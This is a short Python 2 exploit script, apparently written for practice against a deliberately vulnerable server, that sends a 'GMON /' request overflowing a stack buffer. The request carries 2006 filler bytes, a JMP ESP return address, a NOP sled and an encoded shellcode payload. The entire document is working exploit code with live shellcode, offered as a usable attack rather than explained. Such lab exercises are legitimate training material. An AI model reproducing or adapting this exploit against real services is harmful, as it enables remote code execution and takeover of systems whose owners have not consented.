##exploit don't break normal program execution

import socket
from time import sleep
ip = "127.0.0.1"
port= 9999
#625011AF
payload = (
"\xb8\x0b\x1f\x27\x82\xdb\xc6\xd9\x74\x24\xf4\x5b\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x43\x0e\x03\x48\x11\xc5\x77\xb2\xc5\x8b"
"\x78\x4a\x16\xec\xf1\xaf\x27\x2c\x65\xa4\x18\x9c\xed\xe8\x94"
"\x57\xa3\x18\x2e\x15\x6c\x2f\x87\x90\x4a\x1e\x18\x88\xaf\x01"
"\x9a\xd3\xe3\xe1\xa3\x1b\xf6\xe0\xe4\x46\xfb\xb0\xbd\x0d\xae"
"\x24\xc9\x58\x73\xcf\x81\x4d\xf3\x2c\x51\x6f\xd2\xe3\xe9\x36"
"\xf4\x02\x3d\x43\xbd\x1c\x22\x6e\x77\x97\x90\x04\x86\x71\xe9"
"\xe5\x25\xbc\xc5\x17\x37\xf9\xe2\xc7\x42\xf3\x10\x75\x55\xc0"
"\x6b\xa1\xd0\xd2\xcc\x22\x42\x3e\xec\xe7\x15\xb5\xe2\x4c\x51"
"\x91\xe6\x53\xb6\xaa\x13\xdf\x39\x7c\x92\x9b\x1d\x58\xfe\x78"
"\x3f\xf9\x5a\x2e\x40\x19\x05\x8f\xe4\x52\xa8\xc4\x94\x39\xa5"
"\x29\x95\xc1\x35\x26\xae\xb2\x07\xe9\x04\x5c\x24\x62\x83\x9b"
"\x4b\x59\x73\x33\xb2\x62\x84\x1a\x71\x36\xd4\x34\x50\x37\xbf"
"\xc4\x5d\xe2\x10\x94\xf1\x5d\xd1\x44\xb2\x0d\xb9\x8e\x3d\x71"
"\xd9\xb1\x97\x1a\x70\x48\x70\x5a\x85\x52\x81\xcc\x87\x52\x90"
"\x51\x01\xb4\xf8\x79\x47\x6f\x95\xe0\xc2\xfb\x04\xec\xd8\x86"
"\x07\x66\xef\x77\xc9\x8f\x9a\x6b\xbe\x7f\xd1\xd1\x69\x7f\xcf"
"\x7d\xf5\x12\x94\x7d\x70\x0f\x03\x2a\xd5\xe1\x5a\xbe\xcb\x58"
"\xf5\xdc\x11\x3c\x3e\x64\xce\xfd\xc1\x65\x83\xba\xe5\x75\x5d"
"\x42\xa2\x21\x31\x15\x7c\x9f\xf7\xcf\xce\x49\xae\xbc\x98\x1d"
"\x37\x8f\x1a\x5b\x38\xda\xec\x83\x89\xb3\xa8\xbc\x26\x54\x3d"
"\xc5\x5a\xc4\xc2\x1c\xdf\xe4\x20\xb4\x2a\x8d\xfc\x5d\x97\xd0"
"\xfe\x88\xd4\xec\x7c\x38\xa5\x0a\x9c\x49\xa0\x57\x1a\xa2\xd8"
"\xc8\xcf\xc4\x4f\xe8\xc5")

jmp_esp="\xaf\x11\x50\x62"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ip,port))
data=s.recv(1024)
pattern="GMON /"+ "A"*2006 + jmp_esp + "\x90"*40 + payload + "C"*1600 + "\r\n\r\n"
print pattern
s.send(pattern)
data=s.recv(1024)
print(data+str(len(pattern)))
sleep(0.1)






















